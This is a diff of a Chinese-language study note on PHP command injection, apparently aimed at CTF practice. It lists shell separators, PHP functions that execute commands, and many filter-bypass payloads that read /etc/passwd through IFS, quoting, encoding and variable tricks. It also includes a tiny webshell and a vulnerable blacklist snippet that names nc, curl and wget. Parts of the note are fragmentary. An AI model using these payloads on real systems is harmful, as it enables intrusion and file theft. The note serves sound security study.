@@ -4,60 +4,71 @@
 >
 > 代码执行与命令执行的区别？
 
-## 基础
+?>在学习本节之前，建议先学习[Bash基础](Basic/Linux/Bash.md)
 
-`Shell`这个单词的原意是“外壳”，跟`kernel`（内核）相对应，比喻内核外面的一层，即用户跟内核交互的对话界面，也可理解为命令行接口。Linux下的`shell`有： 
-- Bourne Shell (`/usr/bin/sh` or `/bin/sh`)，简称`sh`
-- Bourne Again Shell (`/bin/bash`)，简称`bash`
-- C Shel（`/usr/bin/csh`），简称`csh`
-- Korn Shell (`/usr/bin/ksh`)，简称`ksh`
-- Z Shell（`/usr/bin/zsh` or `/bin/zsh`）简称`zsh`
+## 命令分隔符
 
-`bash`是绝大多数Linux发行版的默认shell。
+|名称|例子|说明|
+|---|---|---|
+|;|`whoami;ls`|命令的结束符，允许一行多个命令从左到右顺序执行，所有命令都会执行。Windows系统下命令提示符`cmd`无此语法。|
+|&&|`whoami&&ls`|逻辑与，只有第一条命令成功执行，才会执行第二条命令。|
+|\|\||`whoami\|\|ls`|逻辑或，只有第一条命令失败时，才会执行第二条命令。|
+|\|||管道符，两个命令都执行，第一条命令的输出作为第二条命令的输入，第一条命令的输出不显示。|
+|&||后台执行，两个命令同时执行。|
+|%0A||PHP环境下使用。|
 
-终端（`terminal`）是通过向用户提供接口来访问`shell`的程序，允许用户通过输入命令并在文本界面查看命令输出。也被成为`控制台`或`命令行界面`。
 
-![](https://media.geeksforgeeks.org/wp-content/uploads/18834419_1198504446945937_35839918_n-300x291.png)
-
-Linux下终端一般为
-`/bin/bash`、`/bin/sh` 和`/bin/zsh等，我们通常以`/bin/bash`进行测试。
 输入输出重定向
-命令行通配符
 
 `$(ls)`
 ls${}${IFS}id
 
-### Bash基础
+
 变量
 模式扩展
 - 花括号扩展
 输出重定向
 
 `command > file	`，将输出重定向到file 
-- [Bash 脚本教程 - 阮一峰](https://wangdoc.com/bash/intro)
-- [Bash Reference Manual](https://www.gnu.org/software/bash/manual/bash.html)
-
-### 命令组合符
-
-|名称|例子|说明|
-|---|---|---|
-|;|`whoami;ls`|分割每条命令，命令按照从左到右的顺序执行，所有命令都会执行。Windows系统下命令提示符`cmd`无此语法|
-|&&|`whoami&&ls`|逻辑与，只有第一条命令执行成功，才会执行第二条命令|
-|\|\||`whoami\|\|ls`|逻辑或，只有第一条命令执行失败，才会执行第二条命令|
-|\|||管道符，两条命令都执行，其中第一条命令的输出作为第二条命令的输入，即不显示第一条命令的输出|
-|&||后台执行，两条命令都执行|
-|%0a，%0d||PHP环境下|
-
-### Linux下的文件读取相关命令
 
 
-### PHP的命令执行相关函数
+## 转义字符
+
+Bash转义字符反斜杠`\`。
+
+换行符是一个特殊字符，表示命令的结束，Bash收到这个字符以后，就会对输入的命令进行解释执行。换行符前面加上反斜杠转义，就使得换行符变成一个普通字符，Bash会将其当作长度为0的空字符处理，从而可以将一行命令写成多行。
+
+PHP中的[escapeshellcmd()](https://www.php.net/manual/zh/function.escapeshellcmd.php)对字符串中可能会欺骗shell命令执行任意命令的字符进行转义。可以使用换行符构造多行命令。
+
+
+
+## Linux下的与文件相关命令
+
+- 列目录、文件
+
+```
+/ls|dir/
+```
+
+- 读文件内容
+
+```php
+/cat|tac|tail|head|more|less|uniq|strings|sort|od|/
+```
+
+```php
+if (!preg_match('/|dir|nl|nc||flag|sh|cut|awk||od|curl|ping|\*||ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo||cc||\.|{|}|tar|zip|gcc||vi|vim|file|xxd|base64|date|bash|env|\?|wget|\'|\"|id|whoami/i', $cmd)) {
+        echo system($cmd);
+  }
+```
+
+## PHP的命令执行相关函数
 
 |函数名称|说明|
 |--|--|
 |[system()](https://www.php.net/manual/zh/function.system.php)|执行外部程序，成功则返回命令输出的最后一行，失败则返回 false。**显示输出**|
-|[exec()](https://www.php.net/manual/zh/function.exec.php)|执行一个外部程序，返回命令执行结果的最后一行内容|
-|[shell_exec()](https://www.php.net/manual/zh/function.shell-exec.php)|通过 shell 执行命令并将完整的输出以字符串的方式返回|
+|[exec()](https://www.php.net/manual/zh/function.exec.php)|执行一个外部程序，**返回**命令执行结果的最后一行内容|
+|[shell_exec()](https://www.php.net/manual/zh/function.shell-exec.php)|通过 shell 执行命令并将完整的输出以字符串的方式**返回**|
 |``[反引号](https://www.php.net/manual/zh/language.operators.execution.php)|将反引号中的内容作为 shell 命令来执行，并将其输出信息返回，与函数 shell_exec() 相同|
 |[passthru()](https://www.php.net/manual/zh/function.passthru.php)|执行外部程序并且**显示原始输出**|
 |[pcntl_exec](https://www.php.net/manual/zh/function.pcntl-exec.php)|在当前进程空间执行指定程序|
@@ -65,11 +76,9 @@ ls${}${IFS}id
 |[proc_open()](https://www.php.net/manual/zh/function.proc-open.php)|执行一个命令，并且打开用来输入/输出的文件指针。|
 |pcntl_exec()||
 
-
-
 - [system()](https://www.php.net/manual/zh/function.system.php) 执行外部程序，并且显示输出
 
-成功则返回命令输出的最后一行，失败则返回`false`;并且显示输出。
+成功则返回命令输出的最后一行，失败则返回`false`;并且**显示输出**。
 
 ```php
 <?php 
@@ -84,7 +93,7 @@ echo system('whoami');
 
 - [exec()](https://www.php.net/manual/zh/function.exec.php)
 
-执行一个外部程序，返回命令执行结果的最后一行内容
+执行一个外部程序，**返回**命令执行结果的最后一行内容
 
 ```php
 exec('whoami'); // 无任何输出
@@ -151,6 +160,7 @@ echo proc_open('whoami', $descriptorspec, $pipes);
 
 ```
 可以赋给一个变量而不是简单地丢弃到标准输出
+
 ## 绕过技巧
 
 <style>
@@ -163,10 +173,24 @@ echo proc_open('whoami', $descriptorspec, $pipes);
 ```markmap
 # RCE绕过技巧
 
-## 空格绕过
+## 绕过空格
 - IFS
 - {}
 - 十六进制
+## 绕过黑名单
+- 字符类
+	- 单引号、双引号
+	- 反引号
+	- 转义字符
+- 变量
+	- 变量拼接
+	- 未初始化的变量
+- 编码转换
+	- Base64
+	- 十六进制
+	- 大小写
+	- 逆序
+- 模式扩展
 ## 长度限制绕过
 - 五字符
 - 四字符
@@ -174,11 +198,12 @@ echo proc_open('whoami', $descriptorspec, $pipes);
  - 123
 
 ## 无回显
-
- - 345
+- 反弹shell
+- DNS信道
+- HTTP信道
 ```
 
-### 空格绕过
+### 绕过空格
 
 ```php
 <?php
@@ -202,19 +227,19 @@ cat${IFS}flag
 cat$IFS$9flag
 ```
 
-- `{}`
+- [大括号扩展](https://wangdoc.com/bash/expansion#%E5%A4%A7%E6%8B%AC%E5%8F%B7%E6%89%A9%E5%B1%95)`{...}`
 
 ```bash
 {cat,/etc/passwd}
 ```
 
-- 重定向
+- 重定向运算符
 
 ```bash
 # 输入重定向
 cat</etc/passwd
 
-# 打开文件描述符
+# 读写
 cat<>/etc/passwd
 ```
 
@@ -231,14 +256,47 @@ x=$'cat\n/etc/passwd';$x
 x=$'cat\t/etc/passwd';$x
 ```
 
-- 使用制表符、换行符
+- 使用制表符
 
 ```bash
 ;ls%09-al%09/home
 ```
 
-### 黑名单关键字绕过
+- 变量截取
+  
+### 绕过黑名单
 
+- 单引号
+
+```bash
+w'h'o'am'i
+wh''oami
+```
+
+- 双引号
+
+```bash
+w"h"o"am"i
+wh""oami
+```
+
+- 反引号\`
+
+```bash
+wh``oami
+```
+
+- 反斜线`\`（转义字符）
+
+```bash
+wh\oami
+
+```
+
+转义字符可以和换行符连用，实现命令续行，URL编码的示例如下：
+```
+ca%5C%0At%20/et%5C%0Ac/pa%5C%0Asswd
+```
 - 变量
 
 ```bash
@@ -249,7 +307,7 @@ a=f;b=lag;cat $a$b # cat flag
 ca${u}t f${u}lag
 ```
 
-- 转换
+- 编码转换
 
 ```bash
 # base64
@@ -263,6 +321,8 @@ $(rev<<<'imaohw') # whoami
 # 大小写
 $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
 $(a="WhOaMi";printf %s "${a,,}")
+
+# 十六进制
 
 ```
 
@@ -288,19 +348,7 @@ cat /fla$(u)g
 cat /fla`u`g
 ```
 
-- 引号
 
-```bash
-'p'i'n'g # ping
-"w"h"o"a"m"i # whoami
-wh''oami
-```
-
-- 反斜线（转义字符）
-
-```bash
-wh\oami
-```
 
 - 位置参数的特殊变量`$@`和`$*`  
 
@@ -326,12 +374,14 @@ cat ${HOME:0:1}etc${HOME:0:1}passwd
 # d
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
+
 ### 绕过IP限制
 
 ```bash
 127.0.0.1 == 2130706433
 ```
-### 长度限制绕过
+
+### 绕过长度限制
 
 ```
 <?=`$_GET[1]`;
@@ -349,7 +399,6 @@ if(strlen($code)<=1) {
 
 
 任意代码执行，13-14
-反弹shell
 
 蚁剑插件 提权 绕过disable_functions
 
@@ -442,6 +491,8 @@ if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
 将非字母、数字的字符经过各种变换，构造出字母、数字，进而得到函数名，结合PHP动态函数的特点，达到执行代码的目的。
 
 PHP 7引入了抽象语法树（AST），与PHP 5在[关于间接使用变量、属性和方法的变化](https://www.php.net/manual/zh/migration70.incompatible.php)。特别说明的是，PHP 7支持`'phpinfo'()`、`('phpinfo')()`。
+
+$_GET[_] 8个字符
 
 - 按位异或XOR`^`
 
